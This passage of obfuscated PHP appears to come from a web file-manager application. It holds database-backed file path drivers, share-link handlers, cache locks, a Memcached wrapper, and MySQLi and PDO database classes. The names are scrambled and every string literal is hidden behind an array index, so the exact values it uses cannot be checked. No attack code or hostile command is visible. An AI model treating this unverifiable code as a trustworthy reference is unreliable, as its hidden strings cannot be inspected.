$this->model->pathInfoByPath($³ó¡¼º¸[0], $èÌ•«Á); } public function infoFull($¾Ä»œ¡) { $äıéïˆ = $this->infoFullSimple($¾Ä»œ¡); return is_array($äıéïˆ) ? $this->model->pathInfo($äıéïˆ[$_SERVER[ÅÄÇĞô][194]]) : !1; } public function hashSimple($è€Ä¥ŸÃ) { $Ş¨üù­İ =& $_SERVER[ÅÄÇĞô]; $¯„õòĞŸ = $this->infoWithChildren($è€Ä¥ŸÃ); return $¯„õòĞŸ[$Ş¨üù­İ[170]][$Ş¨üù­İ[680]]; } public function hashMd5($Çğû¶—¢) { $ª£©‘™¬ =& $_SERVER[ÅÄÇĞô]; $°œÅ‹ã› = $this->infoWithChildren($Çğû¶—¢); return $°œÅ‹ã›[$ª£©‘™¬[170]][$ª£©‘™¬[552]]; } public function exist($·‹øï²Ü) { $™ÄÏÒ =& $_SERVER[ÅÄÇĞô]; $¸®…ºÁ¤ = $this->parse($·‹øï²Ü); if (!$¸®…ºÁ¤[$™ÄÏÒ[87]]) { return $this->isFile($·‹øï²Ü) || $this->isFolder($·‹øï²Ü); } $Èô¾åıÍ = array($™ÄÏÒ[480] => $¸®…ºÁ¤[$™ÄÏÒ[478]], $™ÄÏÒ[32] => $¸®…ºÁ¤[$™ÄÏÒ[87]]); $Îò£ƒÜô = $this->model->where($Èô¾åıÍ)->find(); return $Îò£ƒÜô ? !0 : !1; } public function isFile($­“Ò¥¾ã) { $Î™ĞøÙÓ =& $_SERVER[ÅÄÇĞô]; $ÇÚ˜€“ = $this->infoSimple($­“Ò¥¾ã); return $ÇÚ˜€“ && $ÇÚ˜€“[$Î™ĞøÙÓ[488]] == $Î™ĞøÙÓ[231] ? !0 : !1; } public function isFolder($ÀôªÑñ) { $·ÃÈÕ¦ =& $_SERVER[ÅÄÇĞô]; $ˆ­ğïñœ = $this->infoSimple($ÀôªÑñ); return $ˆ­ğïñœ && $ˆ­ğïñœ[$·ÃÈÕ¦[488]] == $·ÃÈÕ¦[91] ? !0 : !1; } public function listPath($¶õ­Ş¥, $·¼ˆŠÈ = false) { $ÅÔ«‚Ùı =& $_SERVER[ÅÄÇĞô]; if ($¶õ­Ş¥ == $ÅÔ«‚Ùı[12]) { return !1; } $²«ÁœÔ£ = array($ÅÔ«‚Ùı[480] => $¶õ­Ş¥); if ($·¼ˆŠÈ) { return $this->model->listSource($²«ÁœÔ£, -1); } return $this->model->listSource($²«ÁœÔ£); } public function has($½Õ¨Üâ–, $ó™¤Ô·† = false, $¹³î¡Ñ™ = null) { $íÒ„Å¡ =& $_SERVER[ÅÄÇĞô]; $Øß¸éô‡ = $this->infoWithChildren($½Õ¨Üâ–); if ($ó™¤Ô·†) { return array($íÒ„Å¡[243] => $Øß¸éô‡[$íÒ„Å¡[243]], $íÒ„Å¡[242] => $Øß¸éô‡[$íÒ„Å¡[242]]); } return $¹³î¡Ñ™ ? $Øß¸éô‡[$íÒ„Å¡[243]] : $Øß¸éô‡[$íÒ„Å¡[242]]; } public function listAll($úˆ€Ë„š) { $ûØ¡ïş = IO::info($this->pathParse[$_SERVER[ÅÄÇĞô][87]]); if (!$ûØ¡ïş) { return array(); } return $this->model->listAll($úˆ€Ë„š); } public function getContent($ÊØ½•ƒÔ) { return $this->model->getContent($ÊØ½•ƒÔ); } public function setContent($î×ıî¼›, $×éš÷‘´ = '') { return $this->model->setContent($î×ıî¼›, $×éš÷‘´); } public function fileSubstr($îø²ùà¦, $‘Ë¹¬Çİ, $Ğ²£¿¯) { return $this->model->fileSubstr($îø²ùà¦, $‘Ë¹¬Çİ, $Ğ²£¿¯); } public function download($ø ÑÛÊŸ, $Å£‡¯ÜŠ = '') { $ó”Àüùƒ = get_path_father($Å£‡¯ÜŠ); $ªøìéüò = get_path_this($Å£‡¯ÜŠ); $‘Ö¢ÜÌ = $this->model->fileInfoGet($ø ÑÛÊŸ); $˜Ÿé–Ÿæ = IO::copy($‘Ö¢ÜÌ[$_SERVER[ÅÄÇĞô][87]], $ó”Àüùƒ, !1, $ªøìéüò); return $˜Ÿé–Ÿæ; } public function setModifyTime($©ôß¶‹, $º¨¶Û‹½ = '') { $ïäƒµÓÔ =& $_SERVER[ÅÄÇĞô]; if (!$©ôß¶‹) { return; } $this->model->where(array($ïäƒµÓÔ[494] => $©ôß¶‹))->save(array($ïäƒµÓÔ[88] => $º¨¶Û‹½)); } public function upload($ëâôî•, $ì“üœê, $‡¦¦»È = false, $ûØçÒ‡Â = REPEAT_REPLACE) { $ç„ÇßÌÆ =& $_SERVER[ÅÄÇĞô]; $¤Ô¦ ¹Ê = $this->parse($ëâôî•); $’ŸêµĞŒ = $this->model->addFile($¤Ô¦ ¹Ê[$ç„ÇßÌÆ[478]], $ì“üœê, $¤Ô¦ ¹Ê[$ç„ÇßÌÆ[87]], $‡¦¦»È, $ûØçÒ‡Â); return $this->getPathOuter($’ŸêµĞŒ); } public function uploadFileByID($Ò½³ÆÂÅ, $ß®—€Ù, $¢µŠÑ”) { $ïÔİëÒ… =& $_SERVER[ÅÄÇĞô]; $´¡ÎÑ¨ª = $this->parse($Ò½³ÆÂÅ); $®ì˜ÀÖ… = $this->model->addFileByFileID($´¡ÎÑ¨ª[$ïÔİëÒ…[478]], $ß®—€Ù, $´¡ÎÑ¨ª[$ïÔİëÒ…[87]], $¢µŠÑ”); return $this->getPathOuter($®ì˜ÀÖ…); } public function addFileByRemote($ÛĞîËØè, $øˆÃ³»ó, $ğØœ”¸ë = array(), $Î¾­‚ù = '', $öğşÔŒ‹) { $İ¥ÆÚ…« =& $_SERVER[ÅÄÇĞô]; $…¾¬ø§ = $this->parse($ÛĞîËØè); $Î¾­‚ù = empty($Î¾­‚ù) ? $…¾¬ø§[$İ¥ÆÚ…«[87]] : $Î¾­‚ù; $„……Şéñ = $this->model->addFileByRemote($…¾¬ø§[$İ¥ÆÚ…«[478]], $øˆÃ³»ó, $Î¾­‚ù, $ğØœ”¸ë, $öğşÔŒ‹); return $this->getPathOuter($„……Şéñ); } public function uploadLink($É½€•…¸, $³èŠ¥¦Ä = 0) { $ûá•¿Û =& $_SERVER[ÅÄÇĞô]; $ÏÈ±ÛÉâ = $this->parse($É½€•…¸); $ Ó‹ÌÅƒ = _get($GLOBALS[$ûá•¿Û[7]], $ûá•¿Û[1446]); $Ï½†Ìç = _get($GLOBALS[$ûá•¿Û[7]], $ûá•¿Û[1447]); $É½€•…¸ = Model($ûá•¿Û[682])->createFileName($ÏÈ±ÛÉâ[$ûá•¿Û[87]], $ Ó‹ÌÅƒ, $Ï½†Ìç); return IO::uploadLink($É½€•…¸, $³èŠ¥¦Ä); } public function fileNameAuto($é£…‘¼Ÿ, $ŞßÓÌÇ—, $ü¿ı­í = REPEAT_REPLACE, $îéï¼’› = false) { return $this->model->fileNameAuto($é£…‘¼Ÿ, $ŞßÓÌÇ—, $ü¿ı­í, $îéï¼’›); } public function fileNameExist($Æáİäáã, $ªëãœ¹) { return $this->model->fileNameExist($Æáİäáã, $ªëãœ¹); } protected function _fileOut($©…ªœÙê, $¥ÆµÆÎ = false, $¨¯Ã•¤¼ = false, $Øé®Âñ’ = '', $‰éÂÒ ½ = false) { $é¿™š‡ƒ =& $_SERVER[ÅÄÇĞô]; $­É·àÇ× = $this->model->sourceInfo($©…ªœÙê); if ($­É·àÇ×[$é¿™š‡ƒ[488]] == $é¿™š‡ƒ[91]) { header($é¿™š‡ƒ[1448]); die; } $ú¨àÎ¶ = $this->model->fileInfoGet($©…ªœÙê); $Øé®Âñ’ = $ú¨àÎ¶[$é¿™š‡ƒ[552]] ? $ú¨àÎ¶[$é¿™š‡ƒ[552]] : $Øé®Âñ’; $î›˜õÄÃ = isset($GLOBALS[$é¿™š‡ƒ[183]]) && is_array($GLOBALS[$é¿™š‡ƒ[183]]) ? $GLOBALS[$é¿™š‡ƒ[183]][$é¿™š‡ƒ[32]] : $­É·àÇ×[$é¿™š‡ƒ[32]]; if ($‰éÂÒ ½) { return IO::fileOutServer($ú¨àÎ¶[$é¿™š‡ƒ[87]], $¥ÆµÆÎ, $î›˜õÄÃ, $Øé®Âñ’); } IO::fileOut($ú¨àÎ¶[$é¿™š‡ƒ[87]], $¥ÆµÆÎ, $î›˜õÄÃ, $Øé®Âñ’); } public function fileOut($œÕò±Ûç, $‰ŒÉ€õ£ = false, $Õä³¤¹… = false, $¨¸±°¼š = '') { $this->_fileOut($œÕò±Ûç, $‰ŒÉ€õ£, $Õä³¤¹…, $¨¸±°¼š); } public function fileOutServer($¹ËóÏ©, $ƒáõğ’· = false, $„Ä…Îºù = false, $Š‰‰õ‰× = '') { $this->_fileOut($¹ËóÏ©, $ƒáõğ’·, $„Ä…Îºù, $Š‰‰õ‰×, !0); } protected function _fileOutImage($óš»ßŠ, $²ãı‹ÆÅ = 250) { $ãê¼°¬Ì =& $_SERVER[ÅÄÇĞô]; $ëèŒ´ï = $this->model->pathInfo($óš»ßŠ); if ($ëèŒ´ï[$ãê¼°¬Ì[488]] == $ãê¼°¬Ì[91]) { show_json($ãê¼°¬Ì[1449] . $óš»ßŠ, !1); } $áÍÊü¨ô = $this->model->fileInfoGet($óš»ßŠ); $ëèŒ´ï[$ãê¼°¬Ì[184]] = $áÍÊü¨ô[$ãê¼°¬Ì[87]]; $GLOBALS[$ãê¼°¬Ì[183]] = $ëèŒ´ï; IO::fileOutImage($áÍÊü¨ô[$ãê¼°¬Ì[87]], $²ãı‹ÆÅ); } public function fileOutImage($Ù § Û¨, $ôŞÀÑ÷ = 250) { $this->_fileOutImage($Ù § Û¨, $ôŞÀÑ÷); } public function fileOutImageServer($Øôñ•‘, $™ÊŠ¤Ü = 250) { $this->_fileOutImage($Øôñ•‘, $™ÊŠ¤Ü); } public function link($ëÅÏİŠ, $¼‚«ŠéĞ = '') { $¤²Ú«áÚ = $this->model->fileInfoGet($ëÅÏİŠ); return IO::link($¤²Ú«áÚ[$_SERVER[ÅÄÇĞô][87]], $¼‚«ŠéĞ); } protected function parse($Âœ‹ïåù) { $Õ¶Ì†¨Ã =& $_SERVER[ÅÄÇĞô]; if (strstr($Âœ‹ïåù, $Õ¶Ì†¨Ã[8]) === !1) { return array($Õ¶Ì†¨Ã[496] => intval($Âœ‹ïåù), $Õ¶Ì†¨Ã[87] => $Õ¶Ì†¨Ã[12], $Õ¶Ì†¨Ã[1445] => array()); } $èÙÚ³° = explode($Õ¶Ì†¨Ã[8], trim($Âœ‹ïåù, $Õ¶Ì†¨Ã[8])); if (count($èÙÚ³°) < 2) { show_tips(clear_html($Âœ‹ïåù) . $Õ¶Ì†¨Ã[1450]); } return array($Õ¶Ì†¨Ã[496] => intval($èÙÚ³°[0]), $Õ¶Ì†¨Ã[87] => $èÙÚ³°[1], $Õ¶Ì†¨Ã[1445] => array_slice($èÙÚ³°, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Øˆƒ’½) { $this->pathParse = $Øˆƒ’½; $this->model = Model($_SERVER[ÅÄÇĞô][1444]); } public function getPathOuter($é“œ‘äæ) { $ÕºÕÆŞ¢ =& $_SERVER[ÅÄÇĞô]; if (!$é“œ‘äæ) { return $é“œ‘äæ; } $¨û©ÖİĞ = $this->parse($é“œ‘äæ); return trim(KodIO::makeShare($this->pathParse[$ÕºÕÆŞ¢[478]], $¨û©ÖİĞ[$ÕºÕÆŞ¢[478]]), $ÕºÕÆŞ¢[8]); } protected function infoParse($¾±ğ ¯Ó, $ ›å–âğ = false, $ú³ÂÔ»³ = false) { $Ü´’£Áñ =& $_SERVER[ÅÄÇĞô]; $÷»îùëÕ = $this->pathParse[$Ü´’£Áñ[478]]; $Şé”©·ô = trim($this->pathParse[$Ü´’£Áñ[1273]], $Ü´’£Áñ[8]); return Action($Ü´’£Áñ[1451])->sharePathInfo($÷»îùëÕ, $Şé”©·ô, $ ›å–âğ); } public function infoFull($ß˜…÷ª™) { $ÃÎ¼Š¸ =& $_SERVER[ÅÄÇĞô]; $ÏÜÌ‘ßğ = explode($ÃÎ¼Š¸[8], trim($ß˜…÷ª™, $ÃÎ¼Š¸[8])); if (count($ÏÜÌ‘ßğ) > 1) { $¤ÈÁÏÒ… = implode($ÃÎ¼Š¸[8], array_splice($ÏÜÌ‘ßğ, 1)); $·²²®èë = $this->model->pathInfoByPath($ÏÜÌ‘ßğ[0], $¤ÈÁÏÒ…); if (!$·²²®èë) { return !1; } $this->pathParse[$ÃÎ¼Š¸[1273]] = $·²²®èë[$ÃÎ¼Š¸[194]]; } return $this->infoParse($ß˜…÷ª™); } public function listAll($œ¼¼ÙÔ) { $ÂôŞÈ£Û =& $_SERVER[ÅÄÇĞô]; $ï¾Õô¼‹ = IO::info($this->pathParse[$ÂôŞÈ£Û[87]]); if (!$ï¾Õô¼‹) { return array(); } $İµˆÃäî = $this->model->listAll($œ¼¼ÙÔ); $ˆì ü˜ = Model($ÂôŞÈ£Û[672])->getInfo($ï¾Õô¼‹[$ÂôŞÈ£Û[673]]); foreach ($İµˆÃäî as &$‡‹«ôˆ½) { check_abort(); $‡‹«ôˆ½[$ÂôŞÈ£Û[90]] = Action($ÂôŞÈ£Û[1451])->_shareItemeParse($‡‹«ôˆ½[$ÂôŞÈ£Û[90]], $ˆì ü˜); } unset($‡‹«ôˆ½); return $İµˆÃäî; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($€Êñè§) { $this->pathParse = $€Êñè§; $this->model = Model($_SERVER[ÅÄÇĞô][1444]); } protected function infoParse($ÌõĞâ, $éóğœãŸ = false, $çÅÀ¨å” = false) { $“àçã± =& $_SERVER[ÅÄÇĞô]; return Action($“àçã±[1279])->sharePathInfo($this->pathParse[$“àçã±[87]], !0, $éóğœãŸ); } public function listPath($ÑĞæ £Å, $ãõàµô³ = false) { $“éæÆÍ… =& $_SERVER[ÅÄÇĞô]; $¨øâÌ = parent::listPath($ÑĞæ £Å, $ãõàµô³); if (!$¨øâÌ) { return $¨øâÌ; } if (is_array($¨øâÌ[$“éæÆÍ…[1452]])) { $¨øâÌ[$“éæÆÍ…[1452]] = Action($“éæÆÍ…[1279])->shareItemInfo($¨øâÌ[$“éæÆÍ…[1452]]); } foreach ($¨øâÌ as $§Ş…ó•¹ => $ò‘å³îú) { if (!in_array($§Ş…ó•¹, array($“éæÆÍ…[86], $“éæÆÍ…[85]))) { continue; } foreach ($ò‘å³îú as $“¶š±ŒË => $†ªğ¨½) { $¨øâÌ[$§Ş…ó•¹][$“¶š±ŒË] = Action($“éæÆÍ…[1279])->shareItemInfo($†ªğ¨½); } } return $¨øâÌ; } public function listAll($±Æ×ç·) { $Úëµ¥©¾ =& $_SERVER[ÅÄÇĞô]; $èÓçïé¨ = IO::info($this->pathParse[$Úëµ¥©¾[87]]); if (!$èÓçïé¨) { return array(); } $üÚÜíÓç = $this->model->listAll($±Æ×ç·); foreach ($üÚÜíÓç as &$ı†Œ©Ä„) { $ı†Œ©Ä„[$Úëµ¥©¾[90]] = Action($Úëµ¥©¾[1279])->shareItemInfo($ı†Œ©Ä„[$Úëµ¥©¾[90]]); } unset($ı†Œ©Ä„); return $üÚÜíÓç; } } goto AÒäÂøÇ²; dÜ–÷´œßø: class CacheLockMemcached { public function lock($·‡òô ä, $¢—ßöµ÷ = 0) { $Î‘µÏ = Cache::init(); $­÷œªßï = microtime(!0) + $¢—ßöµ÷; while (microtime(!0) < $­÷œªßï) { $Á¾é£ø = $Î‘µÏ->get($·‡òô ä); if (!$Á¾é£ø || $Á¾é£ø < microtime(!0)) { $˜¹‰Õ¹ = $Î‘µÏ->handle->add($·‡òô ä, $­÷œªßï, $¢—ßöµ÷); if ($˜¹‰Õ¹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¶–’Ô¤ñ) { return Cache::init()->get($¶–’Ô¤ñ); } public function unlock($â‚¿‚Ø¢) { return Cache::init()->remove($â‚¿‚Ø¢); } } class CacheLockDatabase { public function lock($»¤Ù´ë², $»˜ô¤â = 0) { $—÷·ª€• = Model($_SERVER[ÅÄÇĞô][929]); $ñ› ‹€ = microtime(!0) + $»˜ô¤â; while (microtime(!0) < $ñ› ‹€) { $¡ŠßÍÌ„ = $—÷·ª€•->get($»¤Ù´ë²); if (!$¡ŠßÍÌ„ || $¡ŠßÍÌ„ < microtime(!0)) { $Â¢èØ¾ó = $—÷·ª€•->set($»¤Ù´ë², $ñ› ‹€); if ($Â¢èØ¾ó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Çğîì¿Ø) { return Model($_SERVER[ÅÄÇĞô][929])->get($Çğîì¿Ø); } public function unlock($Ö®¦âÍŸ) { Model($_SERVER[ÅÄÇĞô][929])->remove($Ö®¦âÍŸ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($»Ú–û‘, $Üò¤Ö¾) { $ãÓ‚„Ã‰ =& $_SERVER[ÅÄÇĞô]; if (!class_exists($ãÓ‚„Ã‰[968])) { show_json($ãÓ‚„Ã‰[969], !1); } $this->cacheTime = $Üò¤Ö¾; $this->handle = new Memcached(); if (is_array($»Ú–û‘[$ãÓ‚„Ã‰[970]]) && count($»Ú–û‘[$ãÓ‚„Ã‰[970]]) >= 1) { foreach ($»Ú–û‘[$ãÓ‚„Ã‰[970]] as $×óığ²Ş) { $ô…ë•… = explode($ãÓ‚„Ã‰[4], $×óığ²Ş); $this->handle->addServer($ô…ë•…[0], $ô…ë•…[1]); } } else { $this->handle->addServer($»Ú–û‘[$ãÓ‚„Ã‰[209]], $»Ú–û‘[$ãÓ‚„Ã‰[210]]); } } public function set($çø¥¿Åµ, $òÈ †¿¢, $ÄŠÃåÓÒ = false) { $ÄŠÃåÓÒ = $ÄŠÃåÓÒ ? $ÄŠÃåÓÒ : $this->cacheTime; return $this->handle->set($çø¥¿Åµ, $òÈ †¿¢, $ÄŠÃåÓÒ); } public function get($’¡øİ¯ê) { return $this->handle->get($’¡øİ¯ê); } public function remove($œ›ó’) { return $this->handle->delete($œ›ó’); } public function deleteAll() { return $this->handle->flush(); } } goto e¤ÕÚİ ‡õ; D§†Ë°ƒ²Õ: class DbMysqli extends Db { public function __construct($Öœ¦ÄÒ = '') { $³‹¥”¦ =& $_SERVER[ÅÄÇĞô]; if (!extension_loaded($³‹¥”¦[1012])) { think_exception(think_lang($³‹¥”¦[14]) . $³‹¥”¦[1013]); } if (!empty($Öœ¦ÄÒ)) { $this->config = $Öœ¦ÄÒ; if (empty($this->config[$³‹¥”¦[17]])) { $this->config[$³‹¥”¦[17]] = $³‹¥”¦[12]; } } } public function connect($˜ôƒô“õ = '', $’Í¬Ãş® = 0) { $€¢¤¥ß =& $_SERVER[ÅÄÇĞô]; if (!isset($this->linkID[$’Í¬Ãş®])) { if (empty($˜ôƒô“õ)) { $˜ôƒô“õ = $this->config; } $this->linkID[$’Í¬Ãş®] = new mysqli($˜ôƒô“õ[$€¢¤¥ß[986]], $˜ôƒô“õ[$€¢¤¥ß[988]], $˜ôƒô“õ[$€¢¤¥ß[989]], $˜ôƒô“õ[$€¢¤¥ß[21]], $˜ôƒô“õ[$€¢¤¥ß[987]] ? intval($˜ôƒô“õ[$€¢¤¥ß[987]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÑæÎ„Õ = $this->linkID[$’Í¬Ãş®]->server_version; $this->linkID[$’Í¬Ãş®]->query($€¢¤¥ß[990] . think_config($€¢¤¥ß[991]) . $€¢¤¥ß[58]); if ($ÑæÎ„Õ > $€¢¤¥ß[992]) { $this->linkID[$’Í¬Ãş®]->query($€¢¤¥ß[993]); } $this->connected = !0; if (1 != think_config($€¢¤¥ß[22])) { unset($this->config); } } return $this->linkID[$’Í¬Ãş®]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($É¶®Óü) { $‡ãÍ†ŒŸ =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $É¶®Óü; if ($this->queryID) { $this->free(); } think_action_status($‡ãÍ†ŒŸ[23], 1); think_status($‡ãÍ†ŒŸ[24]); $this->queryID = $this->_linkID->query($É¶®Óü); if ($this->_linkID->more_results()) { while (($½úÁÅ¶± = $this->_linkID->next_result()) != NULL) { $½úÁÅ¶±->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÉØ‰Ñ¯£) { $á²ƒäÜ =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉØ‰Ñ¯£; if ($this->queryID) { $this->free(); } think_action_status($á²ƒäÜ[25], 1); think_status($á²ƒäÜ[24]); $Ìøˆ¾± = $this->_linkID->query($ÉØ‰Ñ¯£); $this->debug(); if (!1 === $Ìøˆ¾±) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ã©¹œ¼ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ã©¹œ¼) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¸ºÛ— = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¸ºÛ—) { $this->error(); return !1; } } return !0; } private function getAll() { $§™¹ÈÍ = array(); if ($this->numRows > 0) { for ($“¡Ş‡Ç® = 0; $“¡Ş‡Ç® < $this->numRows; $“¡Ş‡Ç®++) { $§™¹ÈÍ[$“¡Ş‡Ç®] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $§™¹ÈÍ; } public function getFields($ûÙğŞ—‰) { $Ê°¸›Ù„ =& $_SERVER[ÅÄÇĞô]; $‘¦€Ñ“‰ = $this->query($Ê°¸›Ù„[997] . $this->parseKey($ûÙğŞ—‰)); $µ¯ô– Ú = array(); if ($‘¦€Ñ“‰) { foreach ($‘¦€Ñ“‰ as $Íä›” => $¨ûÔéñÕ) { $µ¯ô– Ú[$¨ûÔéñÕ[$Ê°¸›Ù„[31]]] = array($Ê°¸›Ù„[32] => $¨ûÔéñÕ[$Ê°¸›Ù„[31]], $Ê°¸›Ù„[33] => $¨ûÔéñÕ[$Ê°¸›Ù„[34]], $Ê°¸›Ù„[35] => (bool) ($¨ûÔéñÕ[$Ê°¸›Ù„[36]] === $Ê°¸›Ù„[12]), $Ê°¸›Ù„[37] => $¨ûÔéñÕ[$Ê°¸›Ù„[38]], $Ê°¸›Ù„[39] => strtolower($¨ûÔéñÕ[$Ê°¸›Ù„[40]]) == $Ê°¸›Ù„[41], $Ê°¸›Ù„[42] => strtolower($¨ûÔéñÕ[$Ê°¸›Ù„[43]]) == $Ê°¸›Ù„[44]); } } return $µ¯ô– Ú; } public function getTables($ı†â”èá = '') { $ÚĞ‡±–é =& $_SERVER[ÅÄÇĞô]; $ïÉÒùäÛ = !empty($ı†â”èá) ? $ÚĞ‡±–é[999] . $ı†â”èá . $ÚĞ‡±–é[1000] : $ÚĞ‡±–é[1001]; $ÏÆ™¸Ùö = $this->query($ïÉÒùäÛ); $©×Ï³‹ = array(); if ($ÏÆ™¸Ùö) { foreach ($ÏÆ™¸Ùö as $ªªÇ·’ => $ÔÛà„×) { $©×Ï³‹[$ªªÇ·’] = current($ÔÛà„×); } } return $©×Ï³‹; } public function replace($ ‘¿Í½, $Ìí¹¢õâ = array()) { $°â‚ÌŒ =& $_SERVER[ÅÄÇĞô]; foreach ($ ‘¿Í½ as $¡²É²ŠÚ => $îöÅ×Ã±) { $şŠº²öá = $this->parseValue($îöÅ×Ã±); if (is_scalar($şŠº²öá)) { $‡©‰™¹ñ[] = $şŠº²öá; $Ü±ÍãÌ[] = $this->parseKey($¡²É²ŠÚ); } } $¶¯Ğ€€Ô = $°â‚ÌŒ[1002] . $this->parseTable($Ìí¹¢õâ[$°â‚ÌŒ[359]]) . $°â‚ÌŒ[1003] . implode($°â‚ÌŒ[50], $Ü±ÍãÌ) . $°â‚ÌŒ[1004] . implode($°â‚ÌŒ[50], $‡©‰™¹ñ) . $°â‚ÌŒ[1005]; return $this->execute($¶¯Ğ€€Ô); } public function insertAll($ŸÈğ†¥¡, $şÚ„¸òÑ = array(), $ØÂä–ıú = false) { $üÙ†¼ıá =& $_SERVER[ÅÄÇĞô]; if (!is_array($ŸÈğ†¥¡[0])) { return !1; } $ş“ŸÂ‰ = array_keys($ŸÈğ†¥¡[0]); $õ¯è¿ı‰ = array(); foreach ($ŸÈğ†¥¡ as $é¬ÍÜÔ) { $ˆğÅíê¬ = array(); foreach ($é¬ÍÜÔ as $äŸğœã => $Úì¥‹Õò) { $Úì¥‹Õò = $this->parseValue($Úì¥‹Õò); if (is_scalar($Úì¥‹Õò)) { $ˆğÅíê¬[] = $Úì¥‹Õò; } } $õ¯è¿ı‰[] = $üÙ†¼ıá[340] . implode($üÙ†¼ıá[50], $ˆğÅíê¬) . $üÙ†¼ıá[1005]; } array_walk($ş“ŸÂ‰, array($this, $üÙ†¼ıá[1006])); $«áÙç–Ø = $ØÂä–ıú ? $üÙ†¼ıá[1007] : $üÙ†¼ıá[1008]; $öùÂŠè = $«áÙç–Ø . $üÙ†¼ıá[1009] . $this->parseTable($şÚ„¸òÑ[$üÙ†¼ıá[359]]) . $üÙ†¼ıá[1003] . implode($üÙ†¼ıá[50], $ş“ŸÂ‰) . $üÙ†¼ıá[1010] . implode($üÙ†¼ıá[50], $õ¯è¿ı‰); return $this->execute($öùÂŠè); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ïî¤£ëÉ =& $_SERVER[ÅÄÇĞô]; $this->error = $this->_linkID->errno . $ïî¤£ëÉ[4] . $this->_linkID->error; if ($ïî¤£ëÉ[12] != $this->queryStr) { $this->error .= LNG($ïî¤£ëÉ[48]) . $this->queryStr; } think_trace($this->error, $ïî¤£ëÉ[12], $ïî¤£ëÉ[49]); return $this->error; } public function escapeString($Û‹ıÊ¾ª) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Û‹ıÊ¾ª); } else { return addslashes($Û‹ıÊ¾ª); } } public function parseKey(&$ Äœ£ñŸ, $€á»™Ëµ = true) { $¬“ñËã =& $_SERVER[ÅÄÇĞô]; if ($€á»™Ëµ) { $ Äœ£ñŸ = $this->parseKeyCheck($ Äœ£ñŸ); } if ($ Äœ£ñŸ != $¬“ñËã[223] && !preg_match($¬“ñËã[1011], $ Äœ£ñŸ)) { $ Äœ£ñŸ = $¬“ñËã[464] . trim($ Äœ£ñŸ, $¬“ñËã[464]) . $¬“ñËã[464]; } return $ Äœ£ñŸ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($÷Œ•Â–Ó = '') { $Şß¸ï˜ =& $_SERVER[ÅÄÇĞô]; if (!class_exists($Şß¸ï˜[1014])) { think_exception(think_lang($Şß¸ï˜[14]) . $Şß¸ï˜[1015]); } if (!empty($÷Œ•Â–Ó)) { $this->config = $÷Œ•Â–Ó; if (empty($this->config[$Şß¸ï˜[17]])) { $this->config[$Şß¸ï˜[17]] = array(); } } } public function connect($Ìå³”ÊØ = '', $ÒÊÒÙı = 0) { $ôéóÃÆ =& $_SERVER[ÅÄÇĞô]; if (!isset($this->linkID[$ÒÊÒÙı])) { if (empty($Ìå³”ÊØ)) { $Ìå³”ÊØ = $this->config; } $²§©Àƒë = !empty($Ìå³”ÊØ[$ôéóÃÆ[17]][$ôéóÃÆ[18]]) ? $Ìå³”ÊØ[$ôéóÃÆ[17]][$ôéóÃÆ[18]] : $this->pconnect; if ($²§©Àƒë) { $Ìå³”ÊØ[$ôéóÃÆ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÒÊÒÙı] = new PDO($Ìå³”ÊØ[$ôéóÃÆ[1016]], $Ìå³”ÊØ[$ôéóÃÆ[988]], $Ìå³”ÊØ[$ôéóÃÆ[989]], $Ìå³”ÊØ[$ôéóÃÆ[17]]); } catch (PDOException $÷´˜ş–…) { think_exception($÷´˜ş–…->getMessage()); } $this->dbType = $this->_getDsnType($Ìå³”ÊØ[$ôéóÃÆ[1016]]); if (in_array($this->dbType, array($ôéóÃÆ[1017], $ôéóÃÆ[1018], $ôéóÃÆ[1019], $ôéóÃÆ[1020]))) { think_exception($ôéóÃÆ[1021] . $this->dbType . $ôéóÃÆ[1022] . $this->dbType . $ôéóÃÆ[1023]); } if (!$this->linkID[$ÒÊÒÙı]) { think_exception($ôéóÃÆ[1024]); } try { $this->linkID[$ÒÊÒÙı]->exec($ôéóÃÆ[1025] . think_config($ôéóÃÆ[991])); } catch (Exception $÷´˜ş–…) { } $this->connected = !0; if (1 != think_config($ôéóÃÆ[22])) { unset($this->config); } } return $this->linkID[$ÒÊÒÙı]; } public function free() { $this->PDOStatement = null; } public function query($‡”õ¸Åş, $ñ úÛÌª = array()) { $èÏ™ŒŸ =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡”õ¸Åş; if (!empty($ñ úÛÌª)) { $this->queryStr .= $èÏ™ŒŸ[1026] . print_r($ñ úÛÌª, !0) . $èÏ™ŒŸ[1027]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($èÏ™ŒŸ[23], 1); think_status($èÏ™ŒŸ[24]); $this->PDOStatement = $this->_linkID->prepare($‡”õ¸Åş); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¥ïµ‘èˆ = $this->PDOStatement->execute($ñ úÛÌª); $this->debug(); if (!1 === $¥ïµ‘èˆ) { $this->error(); return !1; } else { return $this->getAll(); } } public function 